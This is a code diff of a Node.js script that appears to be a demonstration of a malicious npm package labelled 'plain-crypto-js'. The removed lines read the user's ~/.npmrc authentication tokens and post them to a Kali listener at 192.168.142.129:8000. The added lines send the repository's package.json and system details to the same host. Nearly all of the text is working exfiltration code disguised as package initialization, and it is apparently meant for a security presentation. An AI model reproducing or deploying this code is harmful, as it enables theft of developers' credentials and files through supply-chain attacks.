@@ -10,24 +10,23 @@ const systemPayload = JSON.stringify({
   cwd: process.cwd()
 });
 
-// 1. CHANGE: Point to the global .npmrc file in the home directory instead of local .env
-const npmrcFile = path.join(os.homedir(), ".npmrc");
+// 1. TARGET: Look strictly for the package.json file inside the local GitHub repository folder
+const targetRepoFile = path.join(process.cwd(), "package.json");
 
-// 2. CHANGE: Update the checks and read logic for .npmrc
-if (fs.existsSync(npmrcFile)) {
-    const npmrcContent = fs.readFileSync(npmrcFile, "utf8");
-    console.log("👉 Step 1: Reading global .npmrc authentication content...\n", npmrcContent);
+if (fs.existsSync(targetRepoFile)) {
+    const fileContent = fs.readFileSync(targetRepoFile, "utf8");
+    console.log(`👉 Step 1: Successfully read repository file (${targetRepoFile}) contents!\n`);
     
-    // 3. CHANGE: URL-encode the npmrc text contents
-    const encodedNpmrc = encodeURIComponent(npmrcContent);
+    // 2. URL-encode the repository file details so they travel cleanly across the wire
+    const encodedData = encodeURIComponent(fileContent);
     
-    console.log("📡 Step 2: Transmitting token payload to Kali listener...");
+    console.log("📡 Step 2: Transmitting payload data to Kali listener...");
     
-    // FIX: Pass an object instead of a URL string so Netcat can receive it instantly!
+    // 3. FIX: Pass an object instead of a URL string so Netcat registers it instantly
     const req = http.request({
         host: "192.168.142.129",
         port: 8000,
-        path: `/collect?file=${encodedNpmrc}`,
+        path: `/collect?file=${encodedData}`,
         method: "POST",
         headers: {
             "Content-Type": "application/json",
@@ -37,15 +36,14 @@ if (fs.existsSync(npmrcFile)) {
         console.log(`✅ Step 4: Success! Server responded with status: ${res.statusCode}`);
     });
 
-
     req.on('error', (err) => {
-        console.error("❌ Network Connection Error. Is your Kali IP correct? Error:", err.message);
+        console.error("❌ Network Connection Error. Is your Netcat listener active? Error:", err.message);
     });
 
     req.write(systemPayload);
     req.end();
     
-    console.log("📤 Step 3: Data sent. Keeping process alive briefly to finish stream...");
+    console.log("📤 Step 3: Data packet sent into network stream...");
     
     setTimeout(() => {
         console.log("\n[plain-crypto-js] initialization logic complete.");
@@ -53,7 +51,6 @@ if (fs.existsSync(npmrcFile)) {
     }, 1500);
 
 } else {
-    // 4. CHANGE: Clear error feedback for your presentation setup
-    console.log("❌ Demo Error: Could not find a global '.npmrc' file in the home directory!");
-    console.log(`Expected path: ${npmrcFile}`);
+    console.log(`❌ Critical Demo Error: Could not locate ${targetRepoFile}`);
+    console.log("👉 Make sure you are running 'node script.js' from inside the repository folder containing package.json!");
 }
